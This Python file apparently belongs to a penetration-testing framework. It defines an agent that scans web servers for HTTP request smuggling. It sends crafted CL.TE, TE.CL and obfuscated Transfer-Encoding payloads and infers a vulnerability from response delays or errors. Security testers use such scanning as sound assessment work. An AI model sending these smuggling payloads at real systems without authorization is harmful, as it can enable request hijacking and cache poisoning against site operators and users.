"""
HTTPSmugglingCapabilityAgent — HTTP Request Smuggling & Desync Specialist for PenFlow.

Tests reverse proxy and backend servers for:
  1. CL.TE Desync (Front-end uses Content-Length, Back-end uses Transfer-Encoding)
  2. TE.CL Desync (Front-end uses Transfer-Encoding, Back-end uses Content-Length)
  3. TE.TE Obfuscation (Multiple/Malformed Transfer-Encoding headers)
  4. Timeout-based Desync Detection (>4.0s response delay on chunked payload truncation)

Enables discovery of request hijacking, cache poisoning, and internal routing bypasses.
"""
import asyncio
import time
import httpx
from typing import List, Dict, Any, Optional
from penflow.agents.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.http_smuggling")

DESYNC_TIMING_THRESHOLD = 4.0  # Delay threshold indicating backend waiting for missing bytes


class HTTPSmugglingCapabilityAgent(BaseCapabilityAgent):
    """
    HTTP Request Smuggling (CL.TE / TE.CL / TE.TE) Capability Agent.
    Identifies HTTP desynchronization flaws between reverse proxies and origin backends.
    """

    def __init__(self, priority: int = 10):
        super().__init__(agent_name="HTTPSmugglingCapabilityAgent", priority=priority)

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(
                id="http_smuggling_desync",
                name="HTTP Request Smuggling & Desync Detection",
                description="Tests endpoints for CL.TE, TE.CL, and TE.TE HTTP desynchronization vulnerabilities",
                priority=self.priority,
                tags=["http_smuggling", "desync", "proxy", "waf", "cache_poisoning"]
            )
        ]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[HTTPSmugglingCapabilityAgent] Executing capability '{capability_id}' on asset '{context.asset}'")

        http_client = context.get_http_client()
        target_urls = self._collect_proxy_urls(context)

        findings: List[Dict[str, Any]] = []

        for target_url in target_urls[:5]:
            # 1. Test CL.TE Timeout Desync
            cl_te_res = await self._test_cl_te_desync(http_client, target_url)
            if cl_te_res:
                findings.append(cl_te_res)
                if cl_te_res.get("is_vulnerable"):
                    break

            # 2. Test TE.CL Timeout Desync
            te_cl_res = await self._test_te_cl_desync(http_client, target_url)
            if te_cl_res:
                findings.append(te_cl_res)
                if te_cl_res.get("is_vulnerable"):
                    break

            # 3. Test TE.TE Obfuscation
            te_te_res = await self._test_te_te_obfuscation(http_client, target_url)
            if te_te_res:
                findings.append(te_te_res)

        confirmed = [f for f in findings if f.get("is_vulnerable")]
        is_vuln = len(confirmed) > 0
        best = confirmed[0] if confirmed else (findings[0] if findings else {})

        return {
            "status": "COMPLETED",
            "agent": self.name,
            "capability": capability_id,
            "asset": context.asset,
            "is_vulnerable": is_vuln,
            "confidence_score": best.get("confidence", 0.0),
            "evidence": {
                "target_url": best.get("target_url", f"https://{context.asset}"),
                "desync_type": best.get("vector", ""),
                "reasoning": best.get("reasoning", "Reverse proxy and backend servers synchronized on Transfer-Encoding and Content-Length."),
                "findings": findings,
                "evidence_exchanges": [f.get("exchange", {}) for f in findings if f.get("exchange")]
            }
        }

    def _collect_proxy_urls(self, context: CapabilityExecutionContext) -> List[str]:
        urls = []
        for obs in context.observations:
            data = obs.get("data", {}) if isinstance(obs, dict) else {}
            if isinstance(data, dict):
                for ep in data.get("endpoints", []):
                    if isinstance(ep, dict) and ep.get("url"):
                        urls.append(ep["url"])
        if not urls:
            urls = [f"https://{context.asset}/", f"https://{context.asset}/api/v1/health"]
        return list(set(urls))

    async def _test_cl_te_desync(self, http_client: Any, target_url: str) -> Optional[Dict[str, Any]]:
        """
        CL.TE test: Front-end uses Content-Length (6), Back-end uses Transfer-Encoding (chunked).
        Front-end forwards full 6 bytes. Back-end reads chunk size '0\r\n\r\n', leaving 'G' in buffer.
        If back-end waits for next chunk → timeout occurs.
        """
        headers = {
            "Content-Length": "6",
            "Transfer-Encoding": "chunked"
        }
        body = "0\r\n\r\nG"

        t0 = time.monotonic()
        try:
            exch = await http_client.send_as_identity(
                identity_id="anonymous_guest",
                method="POST",
                url=target_url,
                headers=headers,
                body=body
            )
            elapsed = time.monotonic() - t0

            if elapsed >= DESYNC_TIMING_THRESHOLD:
                return {
                    "vector": "CL.TE_desync",
                    "target_url": target_url,
                    "is_vulnerable": True,
                    "confidence": 0.92,
                    "elapsed_sec": round(elapsed, 2),
                    "reasoning": (
                        f"CRITICAL CL.TE HTTP Request Smuggling: Server delayed {elapsed:.2f}s "
                        f"(threshold: {DESYNC_TIMING_THRESHOLD}s). Front-end used Content-Length while "
                        f"Back-end attempted chunked parsing."
                    ),
                    "exchange": exch.to_dict()
                }
        except Exception as e:
            logger.debug(f"[HTTPSmugglingAgent] CL.TE test error: {e}")
        return None

    async def _test_te_cl_desync(self, http_client: Any, target_url: str) -> Optional[Dict[str, Any]]:
        """
        TE.CL test: Front-end uses Transfer-Encoding (chunked), Back-end uses Content-Length (4).
        Front-end forwards chunk until '0\r\n\r\n'. Back-end reads only 4 bytes, leaving smuggled payload.
        """
        headers = {
            "Content-Length": "4",
            "Transfer-Encoding": "chunked"
        }
        body = "5c\r\nPOST /HTTP/1.1\r\nHost: localhost\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n"

        t0 = time.monotonic()
        try:
            exch = await http_client.send_as_identity(
                identity_id="anonymous_guest",
                method="POST",
                url=target_url,
                headers=headers,
                body=body
            )
            elapsed = time.monotonic() - t0

            if elapsed >= DESYNC_TIMING_THRESHOLD:
                return {
                    "vector": "TE.CL_desync",
                    "target_url": target_url,
                    "is_vulnerable": True,
                    "confidence": 0.90,
                    "elapsed_sec": round(elapsed, 2),
                    "reasoning": (
                        f"CRITICAL TE.CL HTTP Request Smuggling: Server delayed {elapsed:.2f}s "
                        f"(threshold: {DESYNC_TIMING_THRESHOLD}s). Front-end used Transfer-Encoding while "
                        f"Back-end used Content-Length."
                    ),
                    "exchange": exch.to_dict()
                }
        except Exception as e:
            logger.debug(f"[HTTPSmugglingAgent] TE.CL test error: {e}")
        return None

    async def _test_te_te_obfuscation(self, http_client: Any, target_url: str) -> Optional[Dict[str, Any]]:
        """
        TE.TE obfuscation test: Provide malformed Transfer-Encoding header variants to see if
        front-end strips/ignores it while back-end processes it.
        """
        obfuscated_headers = [
            {"Transfer-Encoding": "chunked", "Transfer-encoding": "xchunked"},
            {"Transfer-Encoding": " chunked"},
            {"Transfer-Encoding": "chunked, identity"},
        ]

        for headers in obfuscated_headers:
            headers["Content-Length"] = "6"
            try:
                exch = await http_client.send_as_identity(
                    identity_id="anonymous_guest",
                    method="POST",
                    url=target_url,
                    headers=headers,
                    body="0\r\n\r\nG"
                )
                resp = exch.response
                if resp and resp.status_code == 500 and "transfer" in (resp.body_text or "").lower():
                    return {
                        "vector": "TE.TE_obfuscation",
                        "target_url": target_url,
                        "is_vulnerable": True,
                        "confidence": 0.75,
                        "reasoning": f"HIGH: Server disclosed Transfer-Encoding processing anomaly on malformed header variant {headers}.",
                        "exchange": exch.to_dict()
                    }
            except Exception as e:
                logger.debug(f"[HTTPSmugglingAgent] TE.TE test error: {e}")
        return None
